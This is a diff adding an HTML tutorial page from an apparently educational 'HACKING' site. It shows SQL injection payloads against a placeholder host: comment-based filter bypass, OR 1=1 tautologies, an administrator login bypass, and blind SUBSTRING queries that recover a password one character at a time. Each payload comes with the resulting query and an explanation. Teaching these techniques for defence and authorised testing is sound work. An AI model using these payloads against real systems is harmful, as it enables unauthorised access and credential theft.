@@ -1,0 +1,72 @@
+<html>
+    <head>
+        <title>SQL Injection Examples</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+        <div class = "banner">
+            <a class = "top" href="index.html"><h1>HACKING</h1></a>
+        </div>
+        <div class="dropdown">
+            <button class="odropbtn"><img src="Images/menu.png" alt="Menu"></button>
+            <div class="dropdown-content">
+              <a href="index.html">Home</a>
+              <a href="SQL.html">SQL Injection</a>
+              <a href="DDOS.html">DDOS Attack</a>
+              <a href="Social.html">Social Engineering</a>
+              <a href="Malware.html">Malware Programs</a>
+            </div>
+        </div>
+        <div class = "page">
+            <div class = "series">
+                <button class = "backward" onclick="location.href = 'SQL.html'"><img src="Images/arrow_back_24dp_00FF0B_FILL0_wght400_GRAD0_opsz24.png" alt="Arrow back"></button>
+                <p><a href="index.html" class = "maybe">Home</a></p>
+                <div class = "label">
+                    <button class = "more"><img src="Images/right.png" alt="Right Arrow"></button>
+                    <p><a href="SQL.html" class = "arrow">SQL Injection</a></p>
+                </div>
+                <div class = "label">
+                    <button class = "more"><img src="Images/right.png" alt="Right Arrow"></button>
+                    <p><a href="DDOS.html" class = "arrow">DDOS Attack</a></p>
+                </div>
+                <div class = "label">
+                    <button class = "more"><img src="Images/right.png" alt="Right Arrow"></button>
+                    <p><a href="Social.html" class = "arrow">Social Engineering</a></p>
+                </div>
+                <div class = "label">
+                    <button class = "more"><img src="Images/right.png" alt="Right Arrow"></button>
+                    <p><a href="Malware.html" class = "arrow">Malware Programs</a></p>
+                </div>
+            </div>
+            <div class = "item">
+                <h3 class = "other">SQL Injection Examples</h3>
+                <p class = "green">Retrieving Hidden Data:</p>
+                <p class = "blue">https://insecure-website.com/products?category=Gifts'--</p>
+                <p class = "blue">Using this causes: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1</p>
+                <p>Crucially, note that -- is a comment indicator in SQL. This means that the   rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released.</p>
+                <p class = "blue">https://insecure-website.com/products?category=Gifts'+OR+1=1--</p>
+                <p class = "blue">Using this causes:
+                    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+                    </p>
+                <p>The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.</p>
+                <h3 class = "warning">WARNING!</h3>
+                <p class = "blue">Take care when injecting the condition OR 1=1 into a SQL  query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.</p>
+                <p>Subverting Application Logic:</p>
+                <p class = "blue">SELECT * FROM users WHERE username = 'administrator'--' AND  password = ''
+                </p>
+                <p>In this case, an attacker can log in as any user without the need for a  password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. </p>
+                <p>Blind SQL Injection:</p>
+                <p class = "blue">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+                <p class = "blue">TRUE</p>
+                <p class = "green">we know the first character of the password is more than "m"</p>
+                <p class = "blue">AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</p>
+                <p class = "blue">FALSE</p>
+                <p class = "green">Now we know the first character of the password is less than "t"</p>
+                <p class = "blue">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</p>
+                <p class = "blue">TRUE</p>
+                <p class = "green">Therefore we know the first character is "s"</p>
+                <p class = "green">We can continue this process to systematically determine the full password for the Administrator user.</p>
+            </div>
+        </div>
+    </body>
+</html>
